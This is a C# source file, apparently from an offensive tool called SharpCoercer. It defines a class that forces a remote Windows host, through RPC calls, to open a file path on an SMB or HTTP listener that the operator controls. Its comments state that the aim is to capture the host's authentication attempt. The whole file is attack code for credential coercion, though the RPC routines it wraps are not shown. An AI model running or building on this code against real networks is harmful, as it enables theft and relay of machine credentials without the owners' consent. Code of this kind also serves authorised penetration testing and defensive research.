using SharpCoercer.Delegates;
using System;
using System.ComponentModel;
using System.Diagnostics;

namespace SharpCoercer.Abstracts
{
    internal class CoerceFunction
    {
        private readonly IRpcClient owner;
        private DelegateCoerceFunc _delegateCoerceFunc;
        private string _funcName;
        private readonly BuildUrlDelegate urlDelegate;

        public string Name => _funcName;

        public CoerceFunction(IRpcClient owner ,DelegateCoerceFunc delegateCoerceFunc,string funcName,BuildUrlDelegate urlDelegate)
        {
            this.owner = owner;
            _delegateCoerceFunc = delegateCoerceFunc;
            _funcName = funcName;
            this.urlDelegate = urlDelegate;
        }


        /// <summary>
        /// Attempts to coerce the target to open a file from the specified listener, using either SMB or HTTP as configured.
        /// </summary>
        /// <param name="hBind">
        /// The RPC binding handle obtained from a successful Bind call.  
        /// This IntPtr represents the context through which RPC functions will be invoked on the remote server.
        /// </param>
        /// <param name="target">
        /// The address of the remote host to coerce.  
        /// Can be either an IPv4/IPv6 address or a DNS hostname (e.g. "192.168.1.10" or "dc.corp.local").
        /// </param>
        /// <param name="listener">
        /// The endpoint that the target will be tricked into reaching back to.  
        /// Specify the SMB share or HTTP URL listener address (IP or hostname) that you control and that will capture the authentication attempt.
        /// </param>
        /// <param name="smbPort">
        /// The TCP port number on which to perform SMB-based coercion.  
        /// Defaults to 445. If the target listens on a non-standard port, supply that port number here.
        /// </param>
        /// <param name="httpPort">
        /// The TCP port number on which to perform HTTP-based coercion.  
        /// Defaults to 80. If your HTTP listener is bound to a different port, enter it here.
        /// </param>
        /// <param name="IsHttp">
        /// When set to <c>true</c>, use HTTP for the coercion (connecting to the listener over HTTP on <paramref name="httpPort"/>).  
        /// When <c>false</c>, use SMB (connecting to the listener via an SMB share on <paramref name="smbPort"/>).
        /// </param>
        /// <returns>
        /// <c>true</c> if the coercion attempt was successfully initiated (i.e., RPC calls dispatched),  
        /// or <c>false</c> if the operation failed to start (e.g., binding error or invalid parameters).
        /// </returns>

        public int Coerce(IntPtr hBind,string target, string listener,int smbPort = 445,int httpPort = 80,bool IsHttp = false)
        {
            try
            {
                var url = urlDelegate(listener, smbPort, httpPort, IsHttp);
                var result = _delegateCoerceFunc(hBind, target, url);
                Console.WriteLine($"[+] {owner.Name}--->{_funcName}(Filename='{url}') =  {new Win32Exception(result).Message.Trim()}");

                return result;
            }
            catch (Exception ex)
            {
                Trace.WriteLine($"[-] {owner.Name}--->{_funcName} failed: {ex.Message}");
            }
            return -1;
        }

        public override string ToString()
        {
            return _funcName;
        }
    }
}
